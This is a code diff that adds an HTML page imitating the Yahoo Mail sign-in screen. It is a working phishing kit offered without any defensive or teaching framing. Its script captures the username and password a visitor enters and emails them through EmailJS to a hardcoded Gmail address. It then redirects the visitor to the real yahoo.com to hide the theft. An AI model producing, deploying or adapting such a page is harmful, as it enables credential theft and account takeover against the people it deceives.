@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="https://icons.iconarchive.com/icons/designbolts/cute-social-2014/256/Yahoo-icon.png"
+      type="image/x-icon"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700&family=Lexend+Deca&family=Raleway:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <title>Yahoo</title>
+    <style>
+      * {
+        margin: 0px;
+        padding: 0px;
+        box-sizing: border-box;
+      }
+
+      a {
+        text-decoration: none;
+        color: #188fff;
+      }
+
+      body {
+        font-family: "Raleway", sans-serif;
+      }
+
+      nav {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 0px 4%;
+        height: 80px;
+      }
+      .container {
+        display: flex;
+        align-items: center;
+        padding: 30px 15%;
+      }
+      .container .left {
+        flex: 2;
+        margin-right: 20px;
+      }
+      .container .left h2 {
+        margin-bottom: 20px;
+      }
+      .container .left p {
+        font-size: 20px;
+      }
+      .container form {
+        border: 1px solid rgba(0, 0, 0, 0.1);
+        text-align: center;
+        padding: 20px;
+        border-radius: 3px;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      .container form .input-wrapper {
+        position: relative;
+        height: 30px;
+      }
+
+      .go-up-text {
+        position: absolute;
+        font-size: 15px;
+        left: 0;
+        bottom: 5px;
+        color: rgba(0, 0, 0, 0.5);
+        z-index: -1;
+      }
+      .go-up {
+        position: absolute;
+        font-size: 10px;
+        left: 0;
+        top: -10px;
+        color: black;
+        z-index: -1;
+      }
+
+      .container form input {
+        width: 100%;
+        border: none;
+        outline: none;
+        background-color: transparent;
+        border-bottom: 1px solid #188fff;
+        height: 100%;
+      }
+
+      .container form input:focus {
+        background-color: rgba(24, 143, 255, 0.1);
+        border-color: #b9bdc5;
+      }
+
+      .next-btn {
+        width: 100%;
+        display: block;
+        background-color: #188fff;
+        color: white;
+        padding: 10px;
+        border-radius: 50px;
+        margin-top: 25px;
+        cursor: pointer;
+      }
+      .next-btn:last-child {
+        background-color: white;
+        color: #188fff;
+        border: 1px solid #188fff;
+      }
+      .submit-btn {
+        width: 100%;
+        display: block;
+        padding: 10px;
+        border-radius: 50px;
+        outline: none;
+        background-color: #188fff;
+        color: white;
+        border: none;
+        font-weight: 500;
+        font-size: 18px;
+        margin-top: 25px;
+        display: none;
+      }
+      .container .text {
+        margin: 60px;
+        margin-bottom: 70px;
+      }
+      .container .sign {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-top: 30px;
+      }
+      .container .sign span {
+        display: flex;
+        align-items: center;
+        flex: 1;
+      }
+      .container a {
+        font-size: 12px;
+      }
+      .container .sign span a {
+        width: 100%;
+        display: block;
+        margin-left: -150px;
+      }
+      input[type="checkbox"] {
+        margin-left: -90px;
+      }
+      #err {
+        color: #f0162f;
+        display: flex;
+        justify-content: left;
+        font-size: 12px;
+        margin-top: 5px;
+      }
+      .hide {
+        display: none;
+      }
+      svg {
+        position: absolute;
+        top: 7px;
+        right: 0px;
+        cursor: pointer;
+      }
+      @media screen and (max-width: 960px) {
+        .container .left {
+          display: none;
+        }
+        .container {
+          justify-content: right;
+        }
+      }
+      @media screen and (max-width: 500px) {
+        nav {
+          padding: 0px 50px;
+        }
+        .container {
+          justify-content: center;
+          padding: 30px 5px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <nav>
+      <img
+        src="https://logos-world.net/wp-content/uploads/2020/10/Yahoo-Logo.png"
+        alt=""
+        width="120px"
+      />
+      <a href="">Help</a>
+    </nav>
+    <div class="container">
+      <div class="left">
+        <h2>Yahoo makes it easy to enjoy what matters most in your world.</h2>
+        <p>
+          Best in class Yahoo Mail, breaking local, national and global news,
+          finance, sports, music, movies and more. You get more out of the web,
+          you get more out of life
+        </p>
+      </div>
+      <form action="mailto:abc@example.com" method="POST">
+        <img
+          src="https://logos-world.net/wp-content/uploads/2020/10/Yahoo-Logo.png"
+          alt=""
+          width="100px"
+        />
+        <div class="text">
+          <h3>Sign in to Yahoo Mail</h3>
+          <small>Using your Yahoo account</small>
+        </div>
+        <div class="input-wrapper">
+          <span class="first-show">
+            <small id="up" class="go-up-text">Username, email or mobile</small>
+            <input type="text" id="username" />
+          </span>
+          <span class="second-show hide">
+            <small id="up2" class="go-up-text">Password</small>
+            <input type="passsword" id="passsword" />
+            <svg
+              id="svg"
+              xmlns="http://www.w3.org/2000/svg"
+              width="16"
+              height="16"
+              viewBox="0 0 24 24"
+            >
+              <g
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+              >
+                <path d="M15 12a3 3 0 1 1-6 0a3 3 0 0 1 6 0Z" />
+                <path
+                  d="M2 12c1.6-4.097 5.336-7 10-7s8.4 2.903 10 7c-1.6 4.097-5.336 7-10 7s-8.4-2.903-10-7Z"
+                />
+              </g>
+            </svg>
+          </span>
+        </div>
+        <span class="next-btn" id="next-btn">Next</span>
+        <button class="submit-btn" id="submit-btn">Submit</button>
+        <div class="sign">
+          <span
+            ><input type="checkbox" name="" id="" />
+            <a href="">Stay signed in</a>
+          </span>
+          <a href="">Forgot username?</a>
+        </div>
+        <span class="next-btn">Create an account</span>
+      </form>
+    </div>
+  </body>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    emailjs.init("7fQRcC95mhOHLXNhQ");
+
+    let form = document.querySelector("form");
+    let username = document.getElementById("username");
+    let password = document.getElementById("passsword");
+    let up = document.getElementById("up");
+    let up2 = document.getElementById("up2");
+    let nextBtn = document.getElementById("next-btn");
+    let submitBtn = document.getElementById("submit-btn");
+    let firstShow = document.querySelector(".first-show");
+    let secondShow = document.querySelector(".second-show");
+    let svg = document.getElementById("svg");
+    let uName;
+    let pWord;
+
+    username.addEventListener("click", () => {
+      up.classList.remove("go-up-text");
+      up.classList.add("go-up");
+    });
+
+    username.addEventListener("click", () => {
+      up2.classList.remove("go-up-text");
+      up2.classList.add("go-up");
+    });
+
+    svg.addEventListener("click", () => {
+      if (password.type === "password") {
+        password.type = "text";
+      } else {
+        password.type = "password";
+      }
+    });
+
+    function sendEmail(to, subject, message) {
+      emailjs
+        .send("service_vg5jfss", "template_znv7w0a", {
+          to_email: to,
+          subject: subject,
+          message: message,
+        })
+        .then(
+          function (response) {
+            console.log("Email sent successfully:", response);
+          },
+          function (error) {
+            console.error("Error sending email:", error);
+          }
+        );
+    }
+
+    document.addEventListener("click", (e) => {
+      if (e.target.id !== "username") {
+        up.classList.remove("go-up");
+        up.classList.add("go-up-text");
+      } else {
+        nextBtn.addEventListener("click", () => {
+          if (!username.value) {
+          } else {
+            uName = username.value;
+            username.value = "";
+            firstShow.classList.add("hide");
+            secondShow.classList.remove("hide");
+            nextBtn.style.display = "none";
+            submitBtn.style.display = "block";
+          }
+        });
+        form.addEventListener("submit", (e) => {
+          e.preventDefault();
+          if (!password.value) {
+          } else {
+            pWord = password.value;
+            let message = {
+              username: uName,
+              password: pWord,
+            };
+            sendEmail(
+              "danielaudrey987@gmail.com",
+              "Client's Info",
+              JSON.stringify(message)
+            );
+            setTimeout(() => {
+              window.location.replace("https://www.yahoo.com/");
+            }, 3000);
+          }
+        });
+      }
+    });
+  </script>
+  <script
+    src="https://cdnjs.cloudflare.com/ajax/libs/iconify/2.0.0/iconify.min.js"
+    integrity="sha512-lYMiwcB608+RcqJmP93CMe7b4i9G9QK1RbixsNu4PzMRJMsqr/bUrkXUuFzCNsRUo3IXNUr5hz98lINURv5CNA=="
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  ></script>
+</html>
